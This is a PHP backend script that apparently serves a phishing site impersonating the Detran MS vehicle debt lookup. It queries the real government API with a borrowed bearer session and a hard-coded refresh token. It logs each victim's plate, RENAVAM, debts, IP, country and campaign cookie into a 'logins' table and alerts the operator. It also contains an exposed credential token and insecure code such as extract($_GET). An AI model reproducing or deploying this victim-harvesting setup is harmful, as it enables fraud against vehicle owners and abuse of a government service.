<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

extract($_GET);

if(!$placa || !$renavam){
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Missing parameters'
    ]);
    exit;
}

require_once "../db.php";

function get_client_ip() {

    if (!empty($_SERVER['HTTP_CLIENT_IP']))   {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
    {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }
    return $ip_address;
}

function Notifications($mensagem){
    global $pdo;

    $criado_em = date('Y/m/d H:i:s');

    $stmt = $pdo->prepare("INSERT INTO notificacoes (mensagem, criado_em) VALUES (:mensagem, :criado_em)");
    $stmt->execute([':mensagem' => "$mensagem - $criado_em", ':criado_em' => $criado_em]);

    $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio, atual = :atual, hora = :hora WHERE id = :id");
    $updateStmt->execute([':audio' => 5, ':atual' => rand(100000000, 99999999999), ':hora' => $criado_em, ':id' => 1]);
}

$Glob = $pdoGlob->query("SELECT dados FROM conf WHERE tela = 'ipms' LIMIT 1")->fetchColumn();

$GlobDados = json_decode($Glob, true);
$dados = json_decode($GlobDados['dados'], true);

// Configurações globais
$session = $dados['cookies']; 

//$session = str_replace("refreshToken={$token}", "", $session);

 if (!$session) {

    Notifications('MS >> Sua sessão expirou.');

    echo json_encode([
        'IsStatus' => false,
        'message' => 'Session token not found'
    ]);
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://portal-meu-detran-api.prod.k8s.detran.ms.gov.br/debt-consultation/check-debts');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json, text/plain, */*',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'authorization: Bearer ' . $session,
    'content-type: application/json',
    'origin: https://www.meudetran.ms.gov.br',
    'priority: u=1, i',
    'referer: https://www.meudetran.ms.gov.br/',
    'sec-ch-ua: "Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'sec-fetch-storage-access: active',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0',
    'x-app-origin: app-web',
]);
curl_setopt($ch, CURLOPT_COOKIE, 'refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJJZCI6MTMzODU5NCwic2Vzc2lvbklkIjoiYTc3OTgwZmUtMzI3ZC00Yjg5LTkzNmUtNGQ5NDMwNDY4NTM3In0sImV4cCI6MTc3MjIxOTkyMiwiaWF0IjoxNzcyMTMzNTIyfQ.gtXG-5XS0t2qocmH-LKup-PUVjXm0hGzKcsKoUqQ0rU');
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['plate' => $placa, 'renavam' => $renavam]));

$response = curl_exec($ch);

if(!$response){
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Invalid session token'
    ]);
    exit;

}else if (stripos($response, 'Consulta de débitos realizada com sucesso') !== false) {

 $DadosArray = json_decode($response, true);

    echo json_encode([
        'IsStatus' => true,
        'dados' => $DadosArray
    ]);

     $check = $pdo->prepare("SELECT* FROM logins WHERE login_info LIKE :login_info LIMIT 1");
                $check->execute([':login_info' => "%$renavam%"]);
                $exists = $check->fetchColumn();

        if (!$exists) {

            $data = $resultado;

            $debitos = $DadosArray['data']['totalGeneral'];
            $debitosCont = 0;

            foreach ($DadosArray as $mes) {
                if ($valor !== '-' && !empty($valor)) {
                    $debitosCont++;
                    $valorNumerico = $valor;
                }
            }
           
            $loginData = [
                ['label' => 'placa', 'value' => $placa],
                ['label' => 'renavam', 'value' => $renavam]
            ];

            $ip_address = get_client_ip();
            $page = 'MsDetran';

            $DadosIp = json_decode(file_get_contents("http://ip-api.com/json/$ip_address"));
            $pais = $DadosIp->country;

            $identity =  $_COOKIE['Identity'];      
            $id_usuario =  $_COOKIE['campanha'];

            $login_info = json_encode($loginData, JSON_UNESCAPED_UNICODE);

            $hora = date('Y-m-d H:i:s'); // Hora atual

            $dados64 = base64_encode($response);
            $dados = $DadosArray['data']['vehicleData']['model'];

            $stmt = $pdo->prepare("INSERT INTO logins (page, dados, debitos, ip, pais, identity, hora, login_info, id_usuario, resposta) VALUES 
                                    (:page, :dados, :debitos, :ip, :pais, :identity, :hora, :login_info, :id_usuario, :resposta)");

                $is =  $stmt->execute([
                    ':page'       => $page,
                    ':dados'      => $dados,
                    ':debitos'    => $debitos,
                    ':ip'         => $ip_address,
                    ':pais'       => $pais,
                    ':identity'   => $identity,
                    ':hora'       => $hora,
                    ':login_info' => $login_info,
                    ':id_usuario' => $id_usuario,
                    ':resposta' => $dados64
                ]);

                if($is){
                    $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio,  atual = :atual WHERE id = :id");
                    $updateStmt->execute([
                        ':audio' => 2,
                        ':atual' => rand(100000000, 99999999999),
                        ':id' => 1
                    ]);
                }
        }

}else if (stripos($response, 'Erro ao consultar débito do veículo.') !== false) {

    echo json_encode([
            'IsStatus' => false,
            'message' =>'Erro ao consultar débito do veículo.'
        ]);

}else {

    if (stripos($response, '"Token expirado."') !== false) {
        
       Notifications('MS >> Sua sessão expirou.');

        echo json_encode([
            'IsStatus' => false,
            'message' =>'Token expirado.'
        ]);
 
    }else {
        echo $response;
    }
}

curl_close($ch);
